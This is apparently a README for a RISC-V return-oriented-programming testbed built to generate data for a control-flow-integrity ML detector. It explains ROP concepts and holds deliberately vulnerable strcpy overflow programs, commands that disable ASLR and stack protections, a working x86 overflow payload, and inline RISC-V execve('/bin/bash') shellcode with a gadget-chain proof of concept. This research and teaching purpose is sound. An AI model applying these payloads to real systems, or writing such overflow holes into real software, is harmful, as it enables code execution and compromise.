# RISCV-ROP-Testbed

A testbed for **RISCV** vulnerable binaries that aims to produce meaningful fingerprints recognizable by a *Control Flow integrity Machine Learning Algorithm*.

<p align="center">
 <img src="/img/logo.png" align="center" width="30%" >
</p>

---

## What is ROP?
<!--- All the slides comes from here https://dojo.pwn.college -->
*Return-oriented programming (ROP) is a computer security exploit technique that allows an attacker to execute code in the presence of security defenses such as executable space protection and code signing.*

Usually, when it is not possible to do **Code Injection**, we do **Code Reuse**. ROP is a stack-based buffer overflow and this means that the program can be exploited through the overwrite of the return address, found in the stack. This type of attack is coming from the [**Return-to-libc**](https://en.wikipedia.org/wiki/Return-to-libc_attack) attack. An example of a 32 bit stack is in the image below.

![32 bit stack](/img/32bit_stack.png)

Through an overflow that can be caused by a missed code check or a vulnerable function, can lead the attacker to fill the stack with junk and overwrite the return address.

Once the return address is manipulated many things can be done, for example it can be called a function that executes an arbitrary code with the arguments also controlled by the attacker. This is the main concept of the Return-to-libc attack. In this case we replaced the return address with the address of the system() function. See the example below.

![32 bit stack ret2libc](/img/32bit_stack_overflow.png)

Modern architectures however don't support anymore the controlling of the arguments in the functions. For this reason having the control of the return address has to be used in another way.

Through the **code reuse** the code of the program that is being exploited, is called from the attacker to bypass certain checks or to jump to another piece of code. This is the very first principle of the Return Oriented Programming. It follows that using this jump strategy, the program can be "navigated" through the return addressed and if there is an interesting "chain", arbitrary actions can be executed.
The useful pieces of code used to jump in specific part of the program are called "gadgets". The gadget has to return to an address of the next (n+1) gadget in order to do a proper chain. All of this combined is called **ropchain**. In this way a lot of code between the return addresses can be executed in order to reach the goal of the attack, that can be opening a file or executing a shell. 

## Gadgets
### ret

```
ret
leave; ret
pop REG; ret
mov raw, REG; ret
```

But useful functions can also be built as alternative, for example instead of ```mov rax, rsp``` it can be used:

```
push rsp; pop rax; ret
add rax, rsp; ret
xchg raz, rsp; ret
``` 

Usually, also `lea` gadgets are too rare to be used, because is a very long instruction and far from ret. Also `system calls` are very rare and it's better to use **library functions** found in libc.

There are a lot of programs that may help finding gadgets. For example, [rb++](https://github.com/zardus/ctf-tools/tree/master/rp%2B%2B) and [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) that can find many gadgets given your binary file, example below.

![ropgadgets](/img/ropgadgets.png)

## Some complications

* **Limited overflow size** or the removal of the **NULL bytes** from the program that may led to have only one gadget. In this way one thing that can be done is to exec the system() functions. This type of gadget is called **magic gadget**. The aim usually to `execve("/bin/sh")` to get a shell in the system.

* **ASLR** or Address Space Layourt Randomization that randomizes library functions addresses. In this way it is not possible to know the address of system() or other useful functions. It is always possible, with some luck to overwrite only a part of a return address or point to another interesting part of the program and craft the exploit.

* **Stack Canaries** that are used to detect a stack buffer overflow before execution of malicious code can occur. In order to craft an effective exploit, they have to be bypassed. 

*A bruteforce attack may somethimes break ASLR or Canary but it requires a lot of computation. Another workaround can be the [Hacking Blind](https://ieeexplore.ieee.org/document/6956567).*

* **Control Flow Integrity** or CFI that prevent a wide variety of malware attacks from redirecting the flow of execution (the control flow) of a program. Basically this type of control makes sure the target of the return is something that the program is supposed to execute. Some counter-CFI tecniques are:
  * **BOP** (Block) ROP on a block level (higher level instructions) by compensating for side-effects.
  * **JOP** (Jump) using indirect jump instead of return to control execution flow.
  * **COP** (Call) using indirect calls instead of return to control execution flow.
  * **SROP** (Sign return) using signreturn syscall instead of return.
  * **DOP** (Data) overwriting or corrupting the program data instead of controlling the execution flow.
  
Recently, Intel released processors with embedded CFI enforcement. They adds `endbr64` instructions at the beginning of every functions that tells the processor that after every `ret`, this function has to be called.

---

# Testbed
## Buffer Overflow on X86_64
In the following code the `not_called()` function can be called because the `strcpy()` function can be overflowed:

```
void not_called() {
    printf("Enjoy your shell!\n");
    system("/bin/bash");
}

void vulnerable_function(char* string) {
    char buffer[100];
    strcpy(buffer, string);
}

int main(int argc, char** argv) {
    vulnerable_function(argv[1]);
    return 0;
}
```

The program will be compiled for 32 bit architecture without stack protection with `gcc -m32 -fno-stack-protector bof.c` and the ASLR protection will be removed with the command `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`.
Using [GEF](https://github.com/hugsy/gef) the program addressed can be read and the function locations can be printed:

`disas main`
`print not_called`

Inside GEF the exploit can be run with:

`run "$(python -c 'print("A"*107 + "AAAA" + "\xad\x61\x55\x56")')"` 

that fills the buffer and overwrite the return address with the address of `not_called` that executes a shell. An example of this exploit is the image below.

<img src="/img/bof.png"  width="60%" >

## Buffer Overflow on RISCV64 (sifive u74-mc) 
In this scenario it will be used the ISA rv64imafdc.
this time the vulnerable code will be:

```
void not_called() {
    printf("Enjoy your shell!\n");
    system("/bin/bash");
}

int test_empty() {
    printf("Empty function\n");
    return 1;
}

void vulnerable_function(char* string) {
    char buffer[100];
    test_empty();
    strcpy(buffer, string);
}

int main(int argc, char** argv) {
    vulnerable_function(argv[1]);
    return 0;
}
```

Let's compile it with `gcc vuln.c -fno-stack-protector -z execstack -no-pie -Wl,-z,norelro -o riscv_bof.out` to remove all protections and use `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space` to remove ASLR. Once the program is compiled it can be decompiled. For this test it will be used a GDB for RISCV, but this test can also be emulated through [QEMU Emulation for RISCV](https://www.qemu.org/docs/master/system/target-riscv.html). To make sure the binary protections are gone, it can be used the command `checksec --file=riscv_bof.out`.

The file is for a 64 bit architecture.

![32 bit stack ret2libc](/img/file_riscv.png)

In the image below we can clearly see the differences between CISC and RISC registers and instructions.
First of all there are a1..a7 registers that are called **function arguments**, used for system calls, different from the accumulator registers RAX/EAX in CISC. The RISC registers are actually general purpose registers and this means that they can be used for many things including storing data, performing arithmetic and logical operations, and holding addresses for memory access. The way the value is saved is also different between the two architectures. In X86 are often used `MOV` or `LEA` to store values. Instead in this architecture, the store operations are done mainly with `sd` and the registers are set up adding immediates, for examples with `ADDI` instruction. The `JAL` instruction is the same of the `CALL` instruction in X86 and is used to go to the instructions (**jump**) and come back to the saved return address (**link**). The return address in RISCV is stored in the `ra` register. 

<img src="/img/gdb_riscv.png"  width="60%" >

Once the exploit is run, in order to keep the shell open, we can use the `(cat - )` command in pipe with the exploit.

![32 bit stack ret2libc](/img/exploit_riscv.png)

## ROP on RISCV64 (sifive u74-mc)
A very useful guide that explains differences between x86_64 and RiscV principles is [here](https://www.bogdandeac.com/return-oriented-programming-on-risc-v/).

RISC-V is a RISC (Reduced Instruction Set Computer) based on load-store principle. That means that the only instructions that can access off-chip memory are load and store instructions. All instructions have fixed width and must be naturally aligned. Also, RISC-V does not have stack manipulation instructions, like x86–64 or ARM. As we have seen before, x86–64 has POP and RET instructions that updates the value of the stack pointer to point to the next value on the stack. On the other hand, RISC-V uses a sequence of lw (load word) and addi (add immediate) instructions to load a value from the stack and to update the stack pointer. Also, RISC-V does not have a dedicated instruction for return. The ret is a pseudo-instruction that is expanded to jalr zero, 0(ra), which sets the program counter to ra + 0 and saves the previous program counter’s value plus four to register zero, which is hardwired to zero. This implies that the return value must be copied from the stack into ra before returning.

RV32I (Base Integer Instruction Set, 32-bit) has 32 general purpose registers. Some important aspects of registers’ organization are:

    x0/zero is hardwired to zero
    x1/ra holds the return address from a function
    x2/sp holds the stack pointer
    x10-x17/a0-a7 hold arguments for functions
    x8-9, x18-27/s0-s11 (saved registers) preserve their values across function calls; any function that uses the saved registers must restore their original value before returning

## Testing ASM inline code: 

### Getting a shell from a simple function  
With the following **ASM** snippet we can insert inside the C code some Assembly instructions in order to craft the exploit. We need to manipulate the `A0 register` to store the argument of the system() function. At the end we have the `execve()` system call that runs with the parameters of the registers `A0-A7`
The following ASM snippet is inspired by https://ctftime.org/writeup/33544.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int test_empty() {

//  Execution of /bin/bash
    asm ("li s1, 0x68732f6e69622f");   //hex of string /bin/bash
    asm ("sd s1, -16(sp)");            //store S1 on stack
    asm ("addi a0,sp,-16");            //A0 is the syscall argument
    asm ("slt a1,zero,-1");            //A1 is zero (not used)
    asm ("slt a2,zero,-1");            //A2 is zero (not used)
    asm ("li a7, 221");                //loading the execve system call
    asm ("ecall");                     //syscall using previous arguments
    return 1;
}

void vulnerable_function(char* string) {
    char buffer[100];
    strcpy(buffer, string);
}

int main(int argc, char** argv) {
    test_empty();
    vulnerable_function(argv[1]);
    return 0;
}
```

Then running `./rop.o` we got the shell.

<img src="/img/simple_shell.png"  width="50%" >

### Jumping among functions
In the following example we manipulate the code in order to jump to another function and call directly the system call.
If we could find the right gadgets to set up the registers, we could use them and then jump to the `ecall`.
This means that we can jump across functions in RISCV using jal, that is exactly the core of ROP exploitation.
With that, if we can find the correct gadgets that lets us jump across functions at a certain point, we can maintain our registers loaded with some values while executing another piece of code.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void not_called() {
    asm ("li a7, 221");
    asm ("ecall");
    return;
}

int test_empty2() {
    asm ("li s1, 0x68732f6e69622f");   //hex of string /bin/bash
    asm ("sd s1, -16(sp)");
    asm ("addi a0,sp,-16");
    asm ("slt a1,zero,-1");
    asm ("slt a2,zero,-1");
    asm ("jal ra, 0x10506");
    return 1;
}

void test_empty() {
   puts("Test empty");
   return;
}

void vulnerable_function(char* string) {
    char buffer[100];
    strcpy(buffer, string);
}

int main(int argc, char** argv) {
    test_empty();
    vulnerable_function(argv[1]);
    return 0;
}
```

Looking at the disassembled code of `test_empty2()` we can see that at `0x10540` the program jumps to the system call in the `not_called()` function. This is only an semplified example of how a ROP works. In real world the "chain of gadgets" has to be crafted jumping across pieces of ASM code, in this way it is emulated the ROP jump. In addition, ROP attack is usually executed on big executables and the bigger is the binary, the major number of instructions it has, that is an higher success rate in a ROP attack (in some cases, ROP can be even a turing complete language, eg: [**ropc**](https://github.com/pakt/ropc)).  

<img src="/img/jump_call.png"  width="60%" >

Using ROPGadget all the useful gadgets from the executable can be found. The offset of `0x10000` can be specified to get the same addresses of the disassembled code. It has also to be specified the RiscV architecture. ROPGadget doesn't support yet the ropchain crafting for RiscV architectures.

`ROPgadget --rawMode=64 --rawArc=riscv --rawEndian=little --depth=10 --offset 0000000000010000 --binary=rop2.o > gadgets`

Let's use a useless gadget, eg: NOP, only to get a Proof of Concept of how ROP works.

<img src="/img/nop_gadgets.png"  width="70%" >

Looking at the gadget we see that actually it lands on the `nop` instruction inside the `puts()` function. This does nothing and will keep the registers clean, but from the program execution flow it is seen as an instruction call that blocks the normal execution of the program executing the NOP directive and then is chained with the other **hardcoded gadgets** that starts at `0x10516`. 
For how it's done, this ROP example is not so different from a CISC architecture ROP, but in other cases it is much more difficult to do. Here we don't manually use registers and we push with inline ASM code the parameters in the A0 register for the system call. Ideally this has to be done analyzing useful gadgets around the program. **It's not always possible to do a ROP exploitation in a binary**.

*Also keep in mind that in real world scenario we don't have an hardcored function that pushes on the registry the value of "/bin/sh", but many times the value of the shell is taken from other locations, eg: environmental variables as it's done in the **ret2libc attack**.*

<img src="/img/disas_puts.png"  width="70%" >

Putting all togheter the program will have this flow:
**`BUFF -> NOP -> TEST_EMPTY2 -> ECALL`**

And being a ROP exploitation, the executable can also be compiled with the **non-executable** stack and the exploit will still work.

<img src="/img/rop_poc.png"  width="70%" >

---

### Visualization of the chain

In the following diagram it can be seen the order of ROP calls and the flow of the exploited program. The "gadgets" are highlighted in <span style="color:orange">orange</span> and in <span style="color:red">red</span> is marked the vulnerable entrypoint.

<p align="center">
 <img src="/img/rop_drawio.png" align="center" width="80%" >
</p>

---

# Resources and Links

## OS
* [Syscall table](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)
* [SETUID](https://man7.org/linux/man-pages/man2/setuid.2.html)
* [x86_64 registers](https://www.cs.uaf.edu/2017/fall/cs301/lecture/09_11_registers.html) VS [RISCV registers](https://en.wikichip.org/wiki/risc-v/registers)

## ROP

* [What is Return Oriented Programming](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming), [ROP 101](https://ctf101.org/binary-exploitation/return-oriented-programming/) and [Bogdan Deac's explaination](https://infosecwriteups.com/return-oriented-programming-on-risc-v-part-1-dd9817b52d2b)
* [W^X](https://en.wikipedia.org/wiki/W%5EX)
* [Ropper](https://github.com/sashs/Ropper)
* [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
* [rb++](https://github.com/zardus/ctf-tools/tree/master/rp%2B%2B)
* [Pwntools tutorial](https://github.com/Gallopsled/pwntools-tutorial/blob/master/rop.md)
* [RISCV Buffer Overflows](https://github.com/chrysh/riscv_exploitation)
* **Rop Examples**
  * [ROP 1](https://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html)
  * [ROP 2](https://www.youtube.com/watch?v=8zRoMAkGYQE&ab_channel=RazviOverflow)
  * [ROP 3](https://tc.gts3.org/cs6265/2019/tut/tut06-01-rop.html)
  * [RET2LIBC](https://ropemporium.com/challenge/ret2win.html)
* **RISCV ROP**
  * [ROP 1](https://ctftime.org/writeup/33162)
  * [ROP 2](https://ctftime.org/writeup/33544)
  * [RiscyROP](https://www.syssec.wiwi.uni-due.de/fileadmin/fileupload/I-SYSSEC/research/RiscyROP.pdf)
## X86 Architecture
* [Calling Conventions](https://codearcana.com/posts/2013/05/21/a-brief-introduction-to-x86-calling-conventions.html)
* [Registers](https://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture)
## RISCV Architecture
* [KVM RISCV Emulation](https://embeddedinn.xyz/articles/tutorial/exploring_virtualization_in_riscv_machines)

